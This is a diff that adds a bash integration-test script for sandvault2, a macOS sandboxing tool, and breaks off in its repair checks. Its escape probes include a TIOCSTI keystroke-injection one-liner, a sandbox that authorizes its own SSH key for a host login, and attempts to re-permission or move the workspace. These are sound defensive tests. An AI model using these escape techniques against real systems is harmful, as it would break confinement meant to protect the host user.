@@ -1,0 +1,1297 @@
+#!/bin/bash
+# Privileged integration tests for sv2: real accounts, real sessions.
+#
+# Usage: integration DIR     (DIR holds the sv2 and sv2-helper to test)
+#
+# Runs only against an installed helper that is byte-identical to DIR's.
+# Everything is done in a throwaway profile with a random name; the caller's
+# other profiles, and this checkout, are never touched (review-guidelines §8).
+# Escapes are judged from the host side, not from what the sandbox reports.
+#
+# No -E and no ERR trap: most commands here are expected to fail inside $(...)
+# and are judged by check/refused, so a trap would only add noise.
+# shellcheck disable=SC2016 # literal $ and backticks are test data
+# shellcheck disable=SC2310,SC2312 # failures are handled by the checks
+set -euo pipefail
+
+BIN_DIR="${1:?usage: integration DIR}"
+# The suite runs in a session of its own, with no terminal. No check reads
+# the terminal of whoever runs it: the ones about terminals make their own
+# (on_pty). With that terminal, sudo (use_pty) puts it in raw mode for every
+# session: Ctrl-C is then a character passed into the session and not an
+# interrupt, so the run cannot be stopped, and a run that is killed leaves
+# the terminal raw. Taking standard input away is not enough: sudo finds the
+# terminal as the controlling one. So the script starts itself again under a
+# small parent that stays with the terminal, waits, and on Ctrl-C (or TERM,
+# or a hangup) ends everything in the new session; the EXIT trap below then
+# removes the throwaway profile. A CI runner has no terminal here either.
+if [[ -z "${SV2_INTEGRATION_DETACHED:-}" ]]; then
+    SV2_INTEGRATION_DETACHED=1 exec /usr/bin/perl -e '
+        use POSIX qw(setsid);
+        my $pid = fork();
+        die "integration: fork: $!\n" unless defined $pid;
+        if ($pid == 0) {
+            setsid();
+            open(STDIN, "<", "/dev/null");
+            exec @ARGV or die "integration: exec $ARGV[0]: $!\n";
+        }
+        my $stopped = 0;
+        $SIG{INT} = $SIG{TERM} = $SIG{HUP} = sub {
+            print STDERR "\nintegration: stopping, and removing the throwaway profile\n" unless $stopped++;
+            kill "TERM", -$pid;
+        };
+        1 while waitpid($pid, 0) == -1 && $!{EINTR};
+        # Die of the interrupt itself, so that a script that ran this one
+        # stops too and does not go on to its next step.
+        if ($stopped) { $SIG{INT} = "DEFAULT"; kill "INT", $$; exit 130; }
+        exit(($? & 127) ? 128 + ($? & 127) : $? >> 8);
+    ' "${BASH_SOURCE[0]}" "$@"
+fi
+# The sessions here are not given the configuration of whoever runs the
+# suite (~/.config/sandvault2/home): a .gitconfig or a .zshrc of theirs
+# would decide what the checks see.
+export SV2_NO_HOME_COPY=1
+# Nor a browser downloaded into it: --chrome is tested with Google Chrome.
+export SV2_NO_BROWSER_INSTALL=1
+# Absolute: some checks run sv2 from another directory.
+BIN_DIR="$(cd "$BIN_DIR" && pwd)"
+SV2="$BIN_DIR/sv2"
+BUILT_HELPER="$BIN_DIR/sv2-helper"
+HELPER="/Library/PrivilegedHelperTools/sv2-helper"
+STAT=/usr/bin/stat
+TESTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+RED='\033[0;31m'; GREEN='\033[0;32m'; ORANGE='\033[38;5;208m'; NC='\033[0m'
+
+skip() {
+    echo -e "${ORANGE}sv2 integration tests SKIPPED: $1${NC}"
+    echo "    to run them: $SV2 install   (needs sudo)"
+    if [[ "${SV_TESTS_FAIL_ON_SKIP:-0}" == "1" ]]; then
+        echo >&2 "SV_TESTS_FAIL_ON_SKIP=1: a skipped suite is a failure"
+        exit 1
+    fi
+    exit 0
+}
+
+[[ -x "$SV2" && -x "$BUILT_HELPER" ]] || { echo >&2 "no sv2 build in $BIN_DIR"; exit 1; }
+[[ -f "$HELPER" ]] || skip "sv2 is not installed"
+/usr/bin/cmp -s "$BUILT_HELPER" "$HELPER" || skip "the installed helper is not this build"
+# What the helper compares: the artifact versions, not the application's.
+VERSION="$("$SV2" --version | /usr/bin/awk '$1 == "install-version" {print $2}')"
+APP_VERSION="$("$SV2" --version | /usr/bin/awk 'NR == 1 {print $2}')"
+[[ -n "$VERSION" && -n "$APP_VERSION" ]] || { echo >&2 "cannot read versions from $SV2 --version"; exit 1; }
+/usr/bin/sudo -n -- "$HELPER" call "$VERSION" profile-list >/dev/null 2>&1 \
+    || skip "$(id -un) is not in the sv2-users group"
+
+HOST_USER="$(id -un)"
+HOST_UID="$(id -u)"
+P="svt$((RANDOM % 90000 + 10000))"
+# A second throwaway profile, for the checks that add and remove one.
+P2="${P}b"
+ACCOUNT="sv2-$HOST_USER-$P"
+WS="/Users/sv2/$HOST_USER/$P"
+SB="/Library/Application Support/sandvault2/profiles/$HOST_USER/$P.sb"
+SSHD_DROPIN="/etc/ssh/sshd_config.d/000-sandvault2.conf"
+
+PASSED=0
+FAILED=0
+# Where the run is: the section and the last check that finished. The
+# watcher below reads it. Empty until the scratch directory exists.
+SECTION="start"
+PROGRESS=""
+progress() { [[ -z "$PROGRESS" ]] || printf '%s\n%s\n' "$SECTION" "$1" > "$PROGRESS"; }
+pass() { PASSED=$((PASSED + 1)); progress "$1"; [[ "${VERBOSE:-0}" == "0" ]] || echo -e "${GREEN}ok${NC}   $1"; }
+fail() { FAILED=$((FAILED + 1)); progress "$1"; echo -e "${RED}FAIL${NC} $1"; [[ -z "${2:-}" ]] || echo "     $2"; }
+# section NAME: said at every level of VERBOSE, with the time since the
+# start, so that a slow part of the suite can be seen while it runs.
+section() {
+    SECTION="$1"
+    progress "(none yet in this section)"
+    printf '[%4ss] %s\n' "$SECONDS" "$1"
+}
+# check NAME EXPECTED GOT
+check() { if [[ "$2" == "$3" ]]; then pass "$1"; else fail "$1" "expected [$2] got [$3]"; fi; }
+refused() { # NAME CMD...
+    local name="$1"; shift
+    if "$@" >/dev/null 2>&1; then fail "$name" "command succeeded: $*"; else pass "$name"; fi
+}
+# Mode, owner, group and ACL of a path, without the parts of a listing that
+# change when entries are added (link count, size, time).
+security_of() { $STAT -f '%Sp %u %g' "$1"; /bin/ls -lde "$1" | /usr/bin/tail -n +2; }
+
+# Host-only scratch (never the workspace).
+SCRATCH="$(/usr/bin/mktemp -d)"
+PROGRESS="$SCRATCH/progress"
+progress "(none yet)"
+
+# The watcher: when no check has finished for STALL_SECONDS, say where the
+# run is, and again at every further STALL_SECONDS. A step that hangs is the
+# one after the check it names. It stops when this shell is gone.
+STALL_SECONDS="${SV2_TESTS_STALL_SECONDS:-30}"
+[[ "$STALL_SECONDS" =~ ^[1-9][0-9]*$ ]] || STALL_SECONDS=30
+(
+    seen=""; since=0
+    while /bin/sleep 5 && kill -0 $$ 2>/dev/null; do
+        now="$(/bin/cat "$PROGRESS" 2>/dev/null)" || exit 0
+        if [[ "$now" != "$seen" ]]; then seen="$now"; since=0; continue; fi
+        since=$((since + 5))
+        if [[ $((since % STALL_SECONDS)) -eq 0 ]]; then
+            echo -e "${ORANGE}        ... ${since}s in \"${now%%$'\n'*}\" since the last check finished: ${now#*$'\n'}${NC}"
+        fi
+    done
+) &
+WATCHER=$!
+
+cleanup() {
+    set +e
+    # wait: so that bash does not report the watcher as "Terminated".
+    kill "$WATCHER" 2>/dev/null; wait "$WATCHER" 2>/dev/null
+    /bin/rm -rf "$SCRATCH"
+    # Empty the throwaway workspace (find does not follow links), so that the
+    # helper removes the directory too, whichever check the run stopped at.
+    [[ -d "$WS" && ! -L "$WS" ]] && /usr/bin/find "$WS" -mindepth 1 -delete 2>/dev/null
+    "$SV2" profile remove "$P" >/dev/null 2>&1
+    "$SV2" profile remove "$P2" >/dev/null 2>&1
+    /bin/rm -rf "$HOME/.local/state/sandvault2/deploy-keys/$P"
+}
+trap cleanup EXIT
+
+# Run a command in the throwaway profile's sandbox.
+sb() { "$SV2" --profile "$P" shell "$@"; }
+account_exists() { /usr/bin/dscl . -read "/Users/$ACCOUNT" UniqueID >/dev/null 2>&1; }
+
+###############################################################################
+# profile add
+###############################################################################
+section "profile add"
+"$SV2" profile add "$P" >/dev/null
+check "profile add: listed as active" "active" \
+    "$("$SV2" profile list | /usr/bin/awk -v p="$P" '$1 == p {print $2}')"
+
+SB_UID="$(/usr/bin/dscl . -read "/Users/$ACCOUNT" UniqueID | /usr/bin/awk '{print $2}')"
+[[ "$SB_UID" =~ ^[0-9]+$ ]] || { echo >&2 "account $ACCOUNT was not created"; exit 1; }
+if [[ "$SB_UID" -ge 600 ]]; then pass "account: UID >= 600"; else fail "account: UID >= 600" "$SB_UID"; fi
+check "account: primary group is its own" "$SB_UID" \
+    "$(/usr/bin/dscl . -read "/Users/$ACCOUNT" PrimaryGroupID | /usr/bin/awk '{print $2}')"
+if /usr/bin/id -Gn "$ACCOUNT" | /usr/bin/tr ' ' '\n' | /usr/bin/grep -qx staff; then
+    fail "account: not in staff"
+else
+    pass "account: not in staff"
+fi
+check "account: no usable password" "*" \
+    "$(/usr/bin/dscl . -read "/Users/$ACCOUNT" Password | /usr/bin/awk '{print $2}')"
+
+# SSH: with Remote Login on, an account that sshd accepts could connect to
+# itself and get a shell outside its sandbox profile. Every sandbox account is
+# in sv2-sandboxes, and the drop-in refuses that group.
+if /usr/bin/id -Gn "$ACCOUNT" | /usr/bin/tr ' ' '\n' | /usr/bin/grep -qx sv2-sandboxes; then
+    pass "account: in the sv2-sandboxes group"
+else
+    fail "account: in the sv2-sandboxes group" "$(/usr/bin/id -Gn "$ACCOUNT")"
+fi
+check "sshd drop-in: root-owned, not writable by others" "0 644" "$($STAT -f '%u %Lp' "$SSHD_DROPIN")"
+# Installed files carry the version the helper checks before a session. (The
+# sudoers file is not readable from here.)
+artifact_version() { /usr/bin/tr ',' '\n' <<<"$VERSION" | /usr/bin/sed -n "s/^$1=//p"; }
+check "sshd drop-in: carries its version" "# sv2-sshd-version: $(artifact_version sshd)" \
+    "$(/usr/bin/grep -m1 '^# sv2-sshd-version: ' "$SSHD_DROPIN")"
+check "sandbox profile: carries its version" ";; sv2-profile-version: $(artifact_version profile)" \
+    "$(/usr/bin/grep -m1 '^;; sv2-profile-version: ' "$SB")"
+# The sandbox file closes this Mac's SSH port to a session; the helper reads
+# these rules back before it starts one. (What the rule does is a probe.)
+if /usr/bin/grep -qxF '(deny network-outbound (remote tcp "localhost:22"))' "$SB"; then
+    pass "sandbox profile: closes this Mac's port 22"
+else
+    fail "sandbox profile: closes this Mac's port 22" "$(/usr/bin/grep -n 'localhost' "$SB")"
+fi
+# What sshd itself would apply to a login as USER, read from the system's
+# configuration as a whole (so a drop-in that is not included, or is
+# overridden, shows). -T needs a host key; a throwaway one will do.
+/usr/bin/ssh-keygen -q -t ed25519 -N '' -f "$SCRATCH/hostkey"
+sshd_applies() { # USER
+    /usr/sbin/sshd -T -h "$SCRATCH/hostkey" -C "user=$1" 2>&1 | /usr/bin/tr '[:upper:]' '[:lower:]' \
+        | /usr/bin/grep -xE "$SSHD_REFUSALS" | /usr/bin/sort | /usr/bin/tr '\n' '|'
+}
+SSHD_REFUSALS='(denygroups sv2-sandboxes|pubkeyauthentication no|authorizedkeysfile none|forcecommand /usr/bin/false)'
+check "sshd: refuses a login as the sandbox account" \
+    "authorizedkeysfile none|denygroups sv2-sandboxes|forcecommand /usr/bin/false|pubkeyauthentication no|" \
+    "$(sshd_applies "$ACCOUNT")"
+# Control: the Match block must not reach anyone else. (DenyGroups is a list
+# sshd prints for everyone; it only bites members.)
+check "sshd: the refusal does not apply to the host user" "denygroups sv2-sandboxes|" "$(sshd_applies "$HOST_USER")"
+
+check "home: owner and mode" "$SB_UID 700" "$($STAT -f '%u %Lp' "/Users/$ACCOUNT")"
+check "workspace: owner and mode" "$HOST_UID 700" "$($STAT -f '%u %Lp' "$WS")"
+check "workspace parents: root-owned, not writable by others" "0 755 0 755" \
+    "$($STAT -f '%u %Lp' /Users/sv2) $($STAT -f '%u %Lp' "/Users/sv2/$HOST_USER")"
+check "sandbox profile: root-owned, read-only" "0 444" "$($STAT -f '%u %Lp' "$SB")"
+check "the name of the workspace root is taken by sandvault2's hidden account" "sandvault2 reserved name" \
+    "$(/usr/bin/dscl . -read /Users/sv2 RealName 2>/dev/null | /usr/bin/sed -n '2s/^ *//p')"
+
+if "$SV2" profile add "$P" >/dev/null; then pass "profile add: repeatable"; else fail "profile add: repeatable"; fi
+check "profile add: repeat keeps the UID" "$SB_UID" \
+    "$(/usr/bin/dscl . -read "/Users/$ACCOUNT" UniqueID | /usr/bin/awk '{print $2}')"
+
+###############################################################################
+# sessions
+###############################################################################
+section "sessions"
+check "session: runs as the sandbox account" "$ACCOUNT" "$(sb /usr/bin/id -un)"
+check "session: no staff, no host groups" "" \
+    "$(sb /usr/bin/id -Gn | /usr/bin/tr ' ' '\n' | /usr/bin/grep -xE 'staff|admin|wheel|sv2-users' || true)"
+# Acceptance test from the design: the session is in the sandbox user's own
+# launchd domain, not the host user's.
+check "session: own launchd domain (manageruid == uid)" "$SB_UID" "$(sb /bin/launchctl manageruid)"
+check "session: starts in the workspace" "$WS" "$(cd / && sb /bin/pwd)"
+# The sandbox profile, probed from inside a session: what must work works,
+# and what must not does not. These are the probes each rule of the profile
+# is justified by; the helper's unit test runs the same ones without root.
+PROBES="$(sb /bin/bash -c "$(/bin/cat "$(dirname "${BASH_SOURCE[0]}")/profile-probes.sh")" 2>&1 || true)"
+PROBES_OK="$(printf '%s\n' "$PROBES" | /usr/bin/grep -c '^ok ' || true)"
+PROBES_FAILED="$(printf '%s\n' "$PROBES" | /usr/bin/grep '^FAIL' || true)"
+if [[ -z "$PROBES_FAILED" && "$PROBES_OK" -ge 35 ]]; then
+    pass "profile: $PROBES_OK probes as wanted in a session"
+else
+    fail "profile: probes as wanted in a session" "$PROBES_OK ok; $PROBES_FAILED"
+fi
+printf '%s\n' "$PROBES" | /usr/bin/grep '^skip' | /usr/bin/sed 's/^/     /' || true
+
+# The guest launcher: the session's own bin directories lead PATH, Homebrew
+# comes before the system (a login zsh would otherwise put the system first),
+# and the startup file that arranges it was written into the sandbox home.
+SB_PATH="$(sb /bin/sh -c 'printf %s "$PATH"')"
+if [[ "$SB_PATH" == "/Users/$ACCOUNT/.local/bin:/Users/$ACCOUNT/bin:"* ]]; then
+    pass "launcher: the account's bin directories lead PATH"
+else
+    fail "launcher: the account's bin directories lead PATH" "$SB_PATH"
+fi
+for BREW in /opt/homebrew /usr/local; do
+    [[ -x "$BREW/bin/brew" ]] || continue
+    if [[ "${SB_PATH%%:/usr/bin:*}" == *":$BREW/bin"* ]]; then
+        pass "launcher: Homebrew comes before the system in PATH"
+    else
+        fail "launcher: Homebrew comes before the system in PATH" "$SB_PATH"
+    fi
+    break
+done
+check "launcher: startup files are written into the sandbox home" "yes yes" \
+    "$(sb /bin/sh -c 'grep -q "Written once by sandvault2" ~/.zprofile && printf "yes "; test -f ~/.zshrc && printf yes')"
+# The user's own configuration (crates/cli/src/home.rs): the host packs a
+# directory of its own and the sandbox account unpacks it into its home. The
+# launcher's part is run here as sv2 runs it, with an archive made in the
+# scratch directory: the suite does not put anything in ~/.config/sandvault2,
+# which every profile of this user would be given.
+/bin/mkdir -p "$SCRATCH/home/.config/sv2-test"
+echo 'export SV2_TEST_HOME=from-host' > "$SCRATCH/home/.zshenv"
+echo deep > "$SCRATCH/home/.config/sv2-test/conf"
+/bin/chmod 755 "$SCRATCH/home"
+/bin/chmod 600 "$SCRATCH/home/.config/sv2-test/conf"
+sb /bin/sh -c 'echo mine > ~/sv2-test-kept'
+/usr/bin/tar -c -f - -C "$SCRATCH/home" ./.zshenv ./.config \
+    | /usr/bin/sudo -n -- "$HELPER" call "$VERSION" launch "$P" -- \
+        /bin/bash -c "$(/bin/cat "$(dirname "${BASH_SOURCE[0]}")/../guest/launch.sh")" sv2-launch "$WS" unpack \
+    && rc=0 || rc=$?
+check "home copy: the sandbox unpacks the host's archive" "0" "$rc"
+check "home copy: the files are in the sandbox home, the account's, with their modes" \
+    "deep|$ACCOUNT 600|$ACCOUNT 644|mine" \
+    "$(sb /bin/sh -c 'cat ~/.config/sv2-test/conf; stat -f "%Su %Lp" ~/.config/sv2-test/conf ~/.zshenv; cat ~/sv2-test-kept' 2>&1 | /usr/bin/tr '\n' '|' | /usr/bin/sed 's/|$//')"
+check "home copy: a copied startup file takes effect in the next session" "from-host" \
+    "$(sb /bin/sh -c 'echo "$SV2_TEST_HOME"')"
+check "home copy: the home keeps its owner and mode" "$SB_UID 700" "$($STAT -f '%u %Lp' "/Users/$ACCOUNT")"
+sb /bin/rm -f "/Users/$ACCOUNT/.zshenv"
+# The helper ignores the terminal's stop signals so that ^Z cannot park it
+# with the registry lock held. An ignored signal stays ignored across exec,
+# and a session in which ^Z did nothing would be no use.
+check "session: can be suspended (stop signals are not ignored)" "default default default" \
+    "$(sb /usr/bin/perl -e 'print join(" ", map { ($SIG{$_} // "") eq "IGNORE" ? "ignored" : "default" } qw(TSTP TTIN TTOU))')"
+/bin/mkdir "$WS/host dir"
+check "session: starts in the host's directory inside the workspace" "$WS/host dir" \
+    "$(cd "$WS/host dir" && sb /bin/pwd)"
+/bin/rmdir "$WS/host dir"
+check "session: HOME" "/Users/$ACCOUNT" "$(sb /bin/sh -c 'echo "$HOME"')"
+
+check "arguments: passed unchanged" 'a b|$HOME|`id`|x;y|q'"'"'"||-l|--|ünï|*|' \
+    "$(sb /usr/bin/printf '%s|' 'a b' '$HOME' '`id`' 'x;y' "q'\"" '' -l -- 'ünï' '*')"
+rc=0; sb /bin/sh -c 'exit 7' || rc=$?
+check "exit status: propagates" "7" "$rc"
+check "stdin: piped commands run" "piped-42" "$(echo 'echo piped-$((6*7))' | "$SV2" --profile "$P" shell)"
+check "stdin: reaches the command" "HELLO" "$(echo hello | sb /usr/bin/tr a-z A-Z)"
+
+check "environment: host variables do not leak" "" \
+    "$(SV2_TEST_LEAK=leaked SSH_AUTH_SOCK=/tmp/x sb /usr/bin/env | /usr/bin/grep -E '^(SV2_TEST_LEAK|SSH_AUTH_SOCK|SUDO_)' || true)"
+check "environment: TERM is forwarded" "sv2-test-term" "$(TERM=sv2-test-term sb /bin/sh -c 'echo "$TERM"')"
+
+###############################################################################
+# terminal
+###############################################################################
+section "terminal"
+# The session must not share the host's terminal: a process holding the host's
+# tty can push keystrokes into its input queue (TIOCSTI), and the host shell
+# runs them after the session ends. sudo gives the session a pty of its own.
+#
+# on_pty runs a bash script on a fresh pty. script(1) forwards its stdin to
+# the pty and sends EOF when that ends, which a later `read` would see instead
+# of injected input. So stdin is a pipe that a sleep holds open (script
+# rejects a fifo), and the sleep is killed afterwards.
+on_pty() {
+    # The holder's stderr is redirected so it does not keep this function's
+    # output pipe open.
+    SV2="$SV2" P="$P" INJECT="$INJECT" /usr/bin/script -q /dev/null /bin/bash -c "$1" \
+        < <(/bin/sh -c 'echo $$ > "$0"; exec /bin/sleep 120' "$SCRATCH/holder.pid" 2>/dev/null) 2>&1 \
+        | /usr/bin/tr -d '\r'
+    kill "$(/bin/cat "$SCRATCH/holder.pid")" 2>/dev/null || true
+}
+field() { /usr/bin/sed -n "s/^$1=//p" <<<"$2" | /usr/bin/head -1; }
+# 0x80017472 is TIOCSTI.
+INJECT='for (split //, qq(sv2-injected\n)) { ioctl(STDIN, 0x80017472, $_) or die qq(TIOCSTI: $!\n) }'
+
+# Control: without sv2 in between, the injection reaches the shell. If this
+# fails the probe proves nothing and the check after it must not be believed.
+OUT="$(on_pty '/usr/bin/perl -e "$INJECT"; IFS= read -r -t 2 line; echo "host-read=[$line]"')"
+check "terminal: control, injection reaches a shell on the same tty" "[sv2-injected]" "$(field host-read "$OUT")"
+
+OUT="$(on_pty '
+    /bin/stty rows 41 cols 101
+    echo "host-tty=$(/usr/bin/tty)"
+    "$SV2" --profile "$P" shell /bin/sh -c '\''echo "sandbox-tty=$(/usr/bin/tty)"; echo "size=$(/bin/stty size)"'\''
+    "$SV2" --profile "$P" shell /usr/bin/perl -e "$INJECT"; echo "inject-rc=$?"
+    IFS= read -r -t 2 line; echo "host-read=[$line]"
+')"
+HOST_TTY="$(field host-tty "$OUT")"
+SB_TTY="$(field sandbox-tty "$OUT")"
+if [[ "$HOST_TTY" == /dev/ttys* && "$SB_TTY" == /dev/ttys* && "$HOST_TTY" != "$SB_TTY" ]]; then
+    pass "terminal: the session has its own tty"
+else
+    fail "terminal: the session has its own tty" "host [$HOST_TTY] sandbox [$SB_TTY]"
+fi
+check "terminal: window size reaches the session" "41 101" "$(field size "$OUT")"
+# Two things stand in the way, and this shows the first: the default-deny
+# profile refuses the ioctl itself (the kernel asks the sandbox for
+# "hid-control", which nothing allows), so inject-rc is 1 and nothing is
+# read. The second is that the session's tty is not the host's (checked
+# above): under the allow-default profile the ioctl worked, inject-rc was 0,
+# and the keystrokes went to the session's own tty.
+check "terminal: session cannot inject input into the host's tty" "1 []" \
+    "$(field inject-rc "$OUT") $(field host-read "$OUT")"
+
+# tmux inside the sandbox (design: "Terminal multiplexers"): the server
+# outlives the session that started it and a later session attaches to it.
+if sb /bin/sh -c 'command -v tmux' >/dev/null 2>&1; then
+    sb tmux new-session -d -s sv2test '/bin/sleep 600'
+    check "tmux: server outlives the session that started it" "sv2test" \
+        "$(sb tmux list-sessions -F '#{session_name}' 2>&1)"
+    if /usr/bin/pgrep -u "$SB_UID" -x tmux >/dev/null; then
+        pass "tmux: server runs as the sandbox account"
+    else
+        fail "tmux: server runs as the sandbox account"
+    fi
+    # tmux refuses a terminal it cannot clear ("open terminal failed"), and
+    # CI runners have no TERM or TERM=dumb, so the client is given one.
+    OUT="$(on_pty 'TERM=xterm-256color "$SV2" --profile "$P" shell tmux new-session -s sv2attach "echo tmux-says-$((6*7)); /bin/sleep 1"')"
+    if [[ "$OUT" == *tmux-says-42* ]]; then
+        pass "tmux: a client attaches on the session's tty"
+    else
+        fail "tmux: a client attaches on the session's tty" "$(/usr/bin/tail -c 300 <<<"$OUT")"
+    fi
+    sb tmux kill-server 2>/dev/null || true
+else
+    echo -e "${ORANGE}     tmux is not installed: tmux checks NOT RUN${NC}"
+    if [[ "${SV_TESTS_FAIL_ON_SKIP:-0}" == "1" ]]; then
+        fail "tmux: checks ran" "tmux not found in the session's PATH"
+    fi
+fi
+
+###############################################################################
+# confinement (judged from the host side)
+###############################################################################
+section "confinement (judged from the host side)"
+MARK="sv2-test-$$-$RANDOM"
+check "sandbox: cannot read the host home" "" "$(sb /bin/ls "$HOME" 2>/dev/null || true)"
+sb /usr/bin/touch "/Users/Shared/$MARK" 2>/dev/null || true
+if [[ -e "/Users/Shared/$MARK" ]]; then
+    fail "sandbox: cannot write outside the workspace" "/Users/Shared/$MARK was created"
+    /usr/bin/sudo -n -- "$HELPER" call "$VERSION" launch "$P" -- /bin/rm -f "/Users/Shared/$MARK" || true
+else
+    pass "sandbox: cannot write outside the workspace"
+fi
+sb /usr/bin/touch "/Users/sv2/$HOST_USER/$MARK" 2>/dev/null || true
+if [[ -e "/Users/sv2/$HOST_USER/$MARK" ]]; then
+    fail "sandbox: cannot create a sibling of the workspace"
+else
+    pass "sandbox: cannot create a sibling of the workspace"
+fi
+sb /bin/mv "$WS" "/private/tmp/$MARK" 2>/dev/null || true
+if [[ -d "$WS" && ! -e "/private/tmp/$MARK" ]]; then
+    pass "sandbox: cannot move the workspace away"
+else
+    fail "sandbox: cannot move the workspace away"
+fi
+
+# The attack the sshd drop-in exists for: the sandbox authorizes a key for
+# its own account, and a login with that key would be a process outside the
+# sandbox profile. A session cannot reach this Mac's SSH port itself (the
+# profile; probe "this Mac's SSH port"), so the login is tried from here:
+# sshd cannot tell who connects, and the drop-in is what stands between that
+# file and whatever does reach the port. The key is made here and the sandbox
+# is given its public half to authorize. Judged by whether the command ran.
+# Needs Remote Login to be on; what sshd would decide is checked above either
+# way. Where Remote Login is limited to certain users, sshd refuses the
+# account for that reason too, and this check cannot tell the two apart.
+if /usr/bin/nc -z -G 2 127.0.0.1 22 >/dev/null 2>&1; then
+    /usr/bin/ssh-keygen -q -t ed25519 -N '' -f "$SCRATCH/loginkey"
+    LOGIN_PUB="$(/bin/cat "$SCRATCH/loginkey.pub")"
+    check "ssh: precondition, the sandbox authorized the key" "$LOGIN_PUB" "$(sb /bin/sh -c '
+        mkdir -p ~/.ssh && chmod 700 ~/.ssh
+        printf "%s\n" "$1" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+        /usr/bin/tail -1 ~/.ssh/authorized_keys
+    ' sv2 "$LOGIN_PUB" 2>/dev/null || true)"
+    OUT="$(/usr/bin/ssh -F /dev/null -i "$SCRATCH/loginkey" -o IdentitiesOnly=yes -o IdentityAgent=none \
+        -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=10 "$ACCOUNT@127.0.0.1" /usr/bin/touch "/private/tmp/$MARK-ssh" 2>&1 || true)"
+    if [[ "$OUT" == *"Permission denied"* ]]; then
+        pass "ssh: precondition, the login attempt reached sshd"
+    else
+        fail "ssh: precondition, the login attempt reached sshd" "$OUT"
+    fi
+    if [[ -e "/private/tmp/$MARK-ssh" ]]; then
+        fail "ssh: a key the sandbox authorized does not log in to its account" "/private/tmp/$MARK-ssh was created"
+        /usr/bin/sudo -n -- "$HELPER" call "$VERSION" launch "$P" -- /bin/rm -f "/private/tmp/$MARK-ssh" || true
+    else
+        pass "ssh: a key the sandbox authorized does not log in to its account"
+    fi
+else
+    echo -e "${ORANGE}     Remote Login is off: the SSH login attempt was NOT RUN${NC}"
+    if [[ "${SV_TESTS_FAIL_ON_SKIP:-0}" == "1" ]]; then
+        fail "ssh: login attempt ran" "nothing listens on 127.0.0.1 port 22"
+    fi
+fi
+
+# The sandbox can use the workspace but not re-permission, re-own, delete or
+# replace the directory itself. Judged by the directory's mode, owner and ACL
+# as the host sees them before and after. The directory has to be empty here:
+# rmdir of one that is not fails whatever the ACL says.
+check "workspace: precondition, the directory is there and empty" "there" \
+    "$([[ -d "$WS" ]] && echo there; /bin/ls -A "$WS" 2>&1)"
+WS_BEFORE="$(security_of "$WS" 2>&1)" || true
+sb /bin/sh -c '
+    chmod 777 .
+    chmod +a "everyone allow list,search,add_file,delete_child" .
+    chmod -N .
+    chown "$(id -u)" .
+    rmdir "$SV2_WORKSPACE"
+    mv "$SV2_WORKSPACE" "$SV2_WORKSPACE.moved"
+' >/dev/null 2>&1 || true
+check "workspace: sandbox cannot change the directory's mode, owner or ACL" "$WS_BEFORE" "$(security_of "$WS" 2>&1)"
+if [[ ! -e "$WS.moved" ]]; then
+    pass "workspace: sandbox cannot rename the directory in place"
+else
+    fail "workspace: sandbox cannot rename the directory in place"
+fi
+
+# Entries the sandbox creates as private (umask 077) are still the host
+# user's to read and write: access comes from the inherited ACL entries, not
+# from the mode bits.
+sb /bin/sh -c 'umask 077; mkdir -p private/sub && echo secret > private/sub/file'
+check "workspace: sandbox-private entries have no mode bits for the host" "700 600" \
+    "$($STAT -f '%Lp' "$WS/private") $($STAT -f '%Lp' "$WS/private/sub/file")"
+check "workspace: host can read a sandbox-private file" "secret" "$(/bin/cat "$WS/private/sub/file" 2>&1)"
+if echo appended >> "$WS/private/sub/file" && echo from-host > "$WS/private/sub/host-new"; then
+    pass "workspace: host can write inside a sandbox-private directory"
+else
+    fail "workspace: host can write inside a sandbox-private directory"
+fi
+check "workspace: sandbox sees the host's changes there" "secret appended from-host" \
+    "$(sb /bin/sh -c 'cat private/sub/file private/sub/host-new' | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+# Execute permission is never inherited, in either direction.
+sb /bin/sh -c 'printf "#!/bin/sh\necho ran\n" > private/script'
+if [[ -r "$WS/private/script" && ! -x "$WS/private/script" ]]; then
+    pass "workspace: sandbox-created files are not executable by the host"
+else
+    fail "workspace: sandbox-created files are not executable by the host"
+fi
+# Guarded, as the checks around it are: where the host cannot write here, the
+# run goes on and they say so.
+printf '#!/bin/sh\necho ran\n' > "$WS/private/host-script" || true
+check "workspace: host-created files are not executable by the sandbox" "readable not-executable" \
+    "$(sb /bin/sh -c 'test -r private/host-script && echo readable; test -x private/host-script || echo not-executable' | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+if /bin/rm -f "$WS/private/script" "$WS/private/host-script" "$WS/private/sub/file" "$WS/private/sub/host-new" \
+    && /bin/rmdir "$WS/private/sub" "$WS/private"; then
+    pass "workspace: host can remove sandbox-private entries"
+else
+    fail "workspace: host can remove sandbox-private entries"
+fi
+
+sb /bin/sh -c 'echo from-sandbox > sandbox-file && mkdir -p d/e && echo x > d/e/f'
+if [[ -f "$WS/sandbox-file" && -f "$WS/d/e/f" ]]; then
+    pass "workspace: sandbox can create files and directories"
+else
+    fail "workspace: sandbox can create files and directories"
+fi
+check "workspace: sandbox files are owned by the sandbox account" "$SB_UID" "$($STAT -f '%u' "$WS/sandbox-file")"
+# The host user reaches sandbox-created entries through the inherited ACEs.
+if /bin/rm -f "$WS/d/e/f" && /bin/rmdir "$WS/d/e" "$WS/d" && /bin/rm -f "$WS/sandbox-file"; then
+    pass "workspace: host can remove what the sandbox created"
+else
+    fail "workspace: host can remove what the sandbox created"
+fi
+echo from-host > "$WS/host-file"
+check "workspace: sandbox can read and rewrite host files" "from-host" \
+    "$(sb /bin/sh -c 'cat host-file && echo changed > host-file')"
+if [[ ! -x "$WS/host-file" ]]; then pass "workspace: new files are not executable"; else fail "workspace: new files are not executable"; fi
+
+###############################################################################
+# repair
+###############################################################################
+section "repair"
+# Entries with no inherited ACL, as if moved in from elsewhere: host-owned,
+# private mode, so the sandbox has no way in.
+(
+    umask 077
+    echo moved-in > "$WS/moved"
+    /bin/mkdir -p "$WS/moved-dir/sub"
+    echo inner > "$WS/moved-dir/sub/inner"
+)
+/bin/chmod -R -N "$WS/moved" "$WS/moved-dir"
+check "repair: precondition, sandbox cannot open entries without the ACL" "" \
+    "$(sb /bin/sh -c 'cat moved moved-dir/sub/inner' 2>/dev/null || true)"
